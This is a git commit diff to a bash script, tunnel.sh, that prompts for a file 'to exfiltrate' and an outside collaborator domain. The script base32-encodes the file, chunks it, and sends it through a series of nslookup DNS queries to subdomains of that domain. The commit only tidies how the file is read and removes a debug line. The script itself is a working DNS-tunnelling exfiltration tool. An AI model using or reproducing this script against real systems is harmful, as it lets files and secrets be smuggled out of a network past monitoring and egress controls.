f3b56de0f5151629a30c9bd63ad25a37eeaaeb5e
Jake Reynolds <jreynoldsdev@gmail.com>
2017-07-19 20:25:57 -0500

    more newline fixes

--- scripts/tunnel.sh
+++ scripts/tunnel.sh
@@ -8,9 +8,9 @@ read collabDomain
 #Read in data to exfiltrate
 echo -n "File to exfiltrate: "
 read data
-data = `cat $data`
 #Convert data to base32, space into 63-character chunks, delimit on spaces
-data="$(echo $data | base32)"
+#The base32 program might not be included, might want to write base32 encoding into here
+data="$(cat $data | base32)"
 data="$(echo $data | sed -r 's/(.{63})/\1 /g')"
 data="$(echo $data| tr = ' ')"
 
@@ -21,7 +21,6 @@ do
     nslookup "$dnsFlag.$word.$counter.$collabDomain" > /dev/null
     ((counter+=1))
 done
-echo "Counter is $counter"
 
 #Let the server know how many requests we sent
 nslookup "$dnsFlag.$amountFlag.$counter.$collabDomain" > /dev/null
